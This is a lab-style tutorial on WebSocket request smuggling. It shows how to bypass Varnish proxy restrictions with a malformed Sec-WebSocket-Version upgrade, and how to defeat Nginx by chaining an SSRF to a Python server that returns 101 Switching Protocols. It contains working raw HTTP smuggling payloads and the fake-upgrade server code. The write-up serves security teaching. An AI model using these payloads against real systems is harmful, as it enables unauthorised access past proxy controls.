# Request Smuggling: WebSockets

**What is a WebSocket?**

With HTTP, the client must initiate every request before the server can respond. This becomes inefficient for features requiring real-time bidirectional communication, such as notifications or live updates, because the client must continuously poll the server.

WebSockets solve this by establishing a persistent full-duplex connection between the browser and server, allowing both sides to send data at any time.

**Upgrading HTTP Connections to WebSockets.**

WebSockets are designed to be compatible with HTTP. The connection starts as a normal HTTP request containing an `Upgrade: websocket` header and additional WebSocket-specific headers. If supported, the server responds with `101 Switching Protocols`, upgrading the connection from HTTP to WebSocket.

From that point onward, communication uses the WebSocket protocol instead of HTTP.

![img](/img/WebsocketRequestSmuggling/1.svg)

When a proxy sits between the client and backend, it typically forwards the upgrade request instead of handling WebSockets itself. After the upgrade succeeds, the proxy creates a transparent tunnel between client and server, forwarding WebSocket traffic without interpreting it.

![img](/img/WebsocketRequestSmuggling/2.svg)

This creates a challenge for request smuggling: once the tunnel is established, traffic is no longer treated as HTTP. Injecting raw HTTP requests through the tunnel usually fails because the backend expects valid WebSocket frames instead of HTTP messages.

## 1. Abusing WebSockets for Request Smuggling

### 1.1 Smuggling HTTP Requests Through Broken WebSocket Tunnels

Request smuggling is possible when a proxy incorrectly assumes a WebSocket upgrade succeeded while the backend server continues using HTTP.

To trigger this state, send a malformed WebSocket upgrade request that the proxy accepts but the backend rejects. A common method is using an invalid `Sec-WebSocket-Version` value.

Normally, modern WebSocket implementations expect:

```http
Sec-WebSocket-Version: 13
```

If an unsupported version is supplied, the backend rejects the upgrade with:

```http
426 Upgrade Required
```

![img](/img/WebsocketRequestSmuggling/3.svg)

Some proxies fail to validate the backend response and incorrectly assume the connection was upgraded successfully. This creates an unchecked tunnel where arbitrary HTTP requests can be forwarded directly to the backend.

Attack flow:

1. Client sends a WebSocket upgrade request with an invalid version number.
2. Proxy forwards the request to the backend.
3. Backend responds with `426 Upgrade Required` and continues speaking HTTP.
4. Proxy incorrectly assumes the upgrade succeeded and tunnels subsequent traffic without inspection.

![img](/img/WebsocketRequestSmuggling/4.svg)

This technique does not poison other users' connections. It only creates a direct tunnel through the proxy for the attacker's session, allowing frontend restrictions to be bypassed.

### 1.2 Bypassing Proxy Restrictions

In this scenario the `/flag` endpoint is protected by a Varnish proxy. Direct access returns an error generated by Varnish instead of the backend application:

![img](/img/WebsocketRequestSmuggling/5.png)

Comparing this response with requests to nonexistent resources suggests the proxy is specifically blocking `/flag`.

On the same site a WebSocket endpoint exists at `/socket`, which can be abused to establish a broken WebSocket tunnel and smuggle a request to `/flag`.

Payload:

```http
GET /socket HTTP/1.1
Host: MACHINE_IP:8001
Sec-WebSocket-Version: 777
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: MACHINE_IP:8001


```

Important:

* Disable Burp Repeater's **Update Content-Length** option.
* Preserve the final two newlines.

Expected result:

![img](/img/WebsocketRequestSmuggling/6.png)

The backend returns `426 Upgrade Required` for the failed WebSocket upgrade, but the proxy incorrectly switches into tunnel mode. Subsequent traffic, including the smuggled `GET /flag` request, is forwarded directly to the backend.

### What If the Application Doesn't Support WebSockets?

Some vulnerable proxies do not verify whether the target endpoint actually supports WebSockets. They only check whether the request resembles a WebSocket upgrade.

Because of this, the following payload may still succeed even when sent to a normal HTTP endpoint:

```http
GET / HTTP/1.1
Host: MACHINE_IP:8001
Sec-WebSocket-Version: 13
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: MACHINE_IP:8001


```

Even though `/` is not a WebSocket endpoint, the proxy may still enter tunnel mode if it fails to validate the backend response.

Notes:

* Add two trailing newlines after the payload.
* Burp may deliver this unreliably due to connection handling behavior.
* If Burp fails, retry multiple times or send the payload using `netcat`.

## 2. Defeating Secure Proxies

Previous attacks relied on proxies blindly assuming a WebSocket upgrade succeeded. In this scenario, the vulnerable Varnish proxy is replaced with Nginx, which validates backend responses before enabling WebSocket tunnelling.

The backend still exposes:

* `/socket` as a WebSocket endpoint
* `/flag` as the protected target

Reusing the earlier payload now fails:

![img](/img/WebsocketRequestSmuggling/7.png)

Nginx correctly detects the failed upgrade because the backend returns `426 Upgrade Required` instead of `101 Switching Protocols`. Since no valid WebSocket session exists, the proxy refuses to tunnel subsequent requests, preventing the smuggled `/flag` request from reaching the backend.

### 2.1 Tricking the Proxy

To bypass stricter proxies, the goal changes:

* make the proxy believe a valid WebSocket upgrade occurred
* while keeping the backend connection as plain HTTP

This requires forcing the backend to return a fake `101 Switching Protocols` without actually establishing a WebSocket session.

This is possible when the target application contains a vulnerability such as SSRF, allowing backend requests to be redirected to an attacker-controlled server.

Attack flow:

1. Client sends a fake WebSocket upgrade request.
2. Backend application performs an SSRF request to an attacker-controlled server.
3. Attacker server responds with `101 Switching Protocols`.
4. Proxy sees a valid upgrade response and enables tunnelling.
5. Backend never upgrades to WebSocket and continues processing raw HTTP requests.

![img](/img/WebsocketRequestSmuggling/8.svg)

### Leveraging SSRF

The application includes a URL checking feature:

```http
/check-url?server=<url>
```

The backend sends a request to the supplied URL and returns the response status code.

![img](/img/WebsocketRequestSmuggling/9.png)

If external requests can reach an attacker-controlled server, the SSRF can be used to inject arbitrary HTTP responses into the backend workflow.

### Setting Up the Attacker Server

The following Python server responds with `101 Switching Protocols` to every request:

```py
import sys
from http.server import HTTPServer, BaseHTTPRequestHandler

if len(sys.argv)-1 != 1:
    print("""
Usage: {} 
    """.format(sys.argv[0]))
    sys.exit()

class Redirect(BaseHTTPRequestHandler):
   def do_GET(self):
       self.protocol_version = "HTTP/1.1"
       self.send_response(101)
       self.end_headers()

HTTPServer(("", int(sys.argv[1])), Redirect).serve_forever()
```

Run the server:

```bash
user@attackbox$ python3 myserver.py 5555
```

This starts a listener on port `5555` that always returns a `101` response.

### Faking a WebSocket Connection

Use Burp Repeater to send the following payload:

```http
GET /check-url?server=http://10.10.11.155:5555 HTTP/1.1
Host: MACHINE_IP:8002
Sec-WebSocket-Version: 13
Upgrade: WebSocket
Connection: Upgrade
Sec-WebSocket-Key: nf6dB8Pb/BLinZ7UexUXHg==

GET /flag HTTP/1.1
Host: MACHINE_IP:8002


```

Requirements:

* preserve the trailing two newlines
* disable Burp's **Update Content-Length**

Expected result:

![img](/img/WebsocketRequestSmuggling/10.png)

Although `/check-url` is not a WebSocket endpoint, the proxy only evaluates the upgrade request and backend response. Since the attacker-controlled server returns `101 Switching Protocols`, the proxy falsely assumes a valid WebSocket tunnel exists and forwards subsequent traffic directly to the backend.

The backend, however, never upgrades protocols and continues interpreting the tunneled data as normal HTTP requests, allowing the smuggled `GET /flag` request to succeed.
